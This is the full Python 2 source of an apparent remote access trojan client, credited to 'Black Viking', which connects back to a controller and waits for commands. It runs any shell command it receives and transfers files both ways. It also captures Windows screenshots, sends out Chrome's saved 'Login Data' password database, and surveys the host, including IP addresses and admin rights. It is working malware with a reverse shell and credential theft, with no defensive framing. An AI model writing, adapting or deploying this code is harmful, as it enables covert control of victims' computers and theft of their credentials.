#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

__author__ = "Black Viking"
__date__   = "17.03.2017"

END_OF_FILE = "(((END_OF_FILE)))"

import ctypes
import socket
import subprocess
import os
import sys
import base64
import threading
import urllib2
import re
import getpass
import platform
import time
import re
import uuid

if os.name == "nt":
    import ctypes
    from mss.windows import MSS as mss
    sct = mss()
else:
    pass

HOST = '127.0.0.1'
PORT = int('8000')

def crypt(TEXT, encode=True):
    if encode == True:
        return base64.b64encode(TEXT)
    else:
        return base64.b64decode(TEXT)

def send(data):
    s.sendall(crypt(os.getcwd()))
    s.sendall(crypt(data))

def download(command):
    fileName = command.replace("upload ", "")

    f = open(fileName, 'wb')
    while True:
        l = s.recv(1024)
        while l:
            if l.endswith(END_OF_FILE):
                if END_OF_FILE in l:
                    # removing END_OF_FILE flag
                    l = l.replace(END_OF_FILE, "")
                f.write(l)
                args = "[+] Upload complete!"
                s.sendall(crypt(args))
                break
            else:
                f.write(l)
                l = s.recv(1024)
        break
    f.close()
    main()

def upload(command):
    if "screenshot() download " in command:
        fileName = command.replace("screenshot() download ", "")

    else:
        fileName = command.replace("download ", "")
    try:
        f = open(fileName, 'rb')
        l = f.read(1024)

        while (l):
            s.send(l)
            l = f.read(1024)
        f.close()
        s.send(END_OF_FILE)
        if "screenshot() download " in command:
            os.remove(fileName)
        main()

    except IOError:
        s.sendall("File not found\n")
        main()

def screenshot(command):
    if os.name == "nt":
        fileName = command.replace("screenshot() ", "")
        for file in sct.save(mon=-1, output="%s"%(fileName.replace("download ", ""))):
            pass
        upload(command)
    else:
        s.sendall("[!] This func, works only on Windows!\n")
        main()

def chrome_db():
    global db_name
    if os.name == "nt":
        db_name = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
        upload("download %s"%(db_name))
    else:
        s.sendall("[!] This func, works only on Windows!\n")
        main()

def messageBox(text):
    title = text
    t=threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
    t.daemon=True
    t.start()
    
def info():
# basicRAT survey module
# https://github.com/vesche/basicRAT
#
    SURVEY_FORMAT = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Internal Hostname   - {}
    External Hostname   - {}
    Hostname Aliases    - {}
    FQDN                - {}
    Current User        - {}
    System Datetime     - {}
    Admin Access        - {}'''


    def run(plat):
        # OS information
        sys_platform = platform.platform()
        processor    = platform.processor()
        architecture = platform.architecture()[0]

        # session information
        username = getpass.getuser()

        # network information
        hostname    = socket.gethostname()
        fqdn        = socket.getfqdn()
        internal_ip = socket.gethostbyname(hostname)
        raw_mac     = uuid.getnode()
        mac         = ':'.join(('%012X' % raw_mac)[i:i+2] for i in range(0, 12, 2))

        # get external ip address
        ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                       'ipecho.net/plain', 'myexternalip.com/raw',
                       'wtfismyip.com/text' ]
        external_ip = ''
        for url in ex_ip_grab:
            try:
                external_ip = urllib2.urlopen('http://'+url).read().rstrip()
            except IOError:
                pass
            if external_ip and (6 < len(external_ip) < 16):
                break

        # reverse dns lookup
        try:
            ext_hostname, aliases, _ = socket.gethostbyaddr(external_ip)
        except (socket.herror, NameError):
            ext_hostname, aliases = '', []
        aliases = ', '.join(aliases)

        # datetime, local non-DST timezone
        dt = time.strftime('%a, %d %b %Y %H:%M:%S {}'.format(time.tzname[0]),
             time.localtime())

        # platform specific
        is_admin = False

        if plat == 'win':
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

        elif plat in ['nix', 'mac']:
            is_admin = os.getuid() == 0

        admin_access = 'Yes' if is_admin else 'No'

        # return survey results
        return SURVEY_FORMAT.format(sys_platform, processor, architecture,
        internal_ip, external_ip, mac, hostname, ext_hostname, aliases, fqdn,
        username, dt, admin_access)

    plat = sys.platform
    if plat.startswith('win'):
        plat = 'win'
    elif plat.startswith('linux'):
        plat = 'nix'
    elif plat.startswith('darwin'):
        plat = 'mac'
    else:
        plat = 'unk'

    message = run(plat)
    send(message)

def connect():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
        send(socket.gethostname())
    except:
        connect()

    

def main():
    while True:
        command = crypt(s.recv(1024), False)
        if command[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(command[3:].decode("utf-8"))
                send(" ")
            except OSError:
                send("%s: No such file or directory"%(command[3:]))

        elif command == "info()":
            info()
            main()

        elif "upload" in command:
            download(command)

        elif "download" in command and "screenshot()" not in command and "chrome_db" not in command:
            upload(command)

        elif "screenshot()" in command:
            screenshot(command)

        elif command == "download chrome_db":
            chrome_db()

        elif "execute" in command:
            command = command.replace("execute ", "")
            subprocess.Popen(command, shell=True)
            send("Running program in a new process\n")
            
        elif "message" in command:
            messageBox(command.replace("message ", ""))
            send(" ")
            
        elif command == "pwd":
            send(os.getcwd()+"\n")

        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = process.stdout.read() + process.stderr.read()
            if output == "":
                output = " "
            send(output)
            
    s.close()

def start():
    while True:
        try:
            connect()
            main()
        except Exception as e:
            print e
            start()

if __name__ == "__main__":
    start()
